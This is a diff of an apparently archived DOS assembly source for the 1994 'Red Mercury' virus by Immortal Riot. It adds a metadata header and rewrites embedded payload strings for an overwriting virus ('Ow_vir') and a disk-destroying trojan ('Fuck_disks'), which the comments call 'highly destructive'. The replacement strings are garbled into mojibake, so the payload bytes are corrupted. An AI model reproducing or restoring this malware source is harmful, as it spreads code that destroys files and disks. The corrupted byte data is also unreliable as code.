@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      R
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;			 Red Mercury 1.00
 ;      "Created by Immortal Riot's destructive development team"
 ;              (c) '94 The Unforgiven/Immortal Riot 
@@ -451,10 +462,10 @@ ret				;
 ; to c:\dos\keyb.com. The ow_vir is an overwriting virus, and the trash_disks
 ; is a plain, simple and highly destructive trojan. Use with care!
 
-Ow_vir   db "è ë$  ¾)‹¹ .1FFâùÃèë",0ffh,"º ´@±QÍ!èß",0ffh,"ÃºM´NÍ!sÃ¸=ºž Í!Çú “èÔ",0ffh,"´>Í!´Oëá*.* "
+Ow_vir   db "ï¿½ ï¿½$  ï¿½)ï¿½ï¿½ .1FFï¿½ï¿½ï¿½ï¿½ï¿½",0ffh,"ï¿½ ï¿½@ï¿½Qï¿½!ï¿½ï¿½",0ffh,"ÃºMï¿½Nï¿½!sÃ¸=ï¿½ï¿½ ï¿½!ï¿½ï¿½ ï¿½ï¿½ï¿½",0ffh,"ï¿½>ï¿½!ï¿½Oï¿½ï¿½*.* "
 Ow_lenght equ $-ow_vir	
 			
-Fuck_disks db '°¹w»™Í&þÀ<u÷ÃI hereby annex this sector as the property of IR!'
+Fuck_disks db 'ï¿½ï¿½wï¿½ï¿½ï¿½&ï¿½ï¿½<uï¿½ï¿½I hereby annex this sector as the property of IR!'
 Trashlenght     equ $-fuck_disks
 ;-------------------------------------------------------------------------------
 V_name   db " Red Mercury (c) '94 The Unforgiven/Immortal Riot "
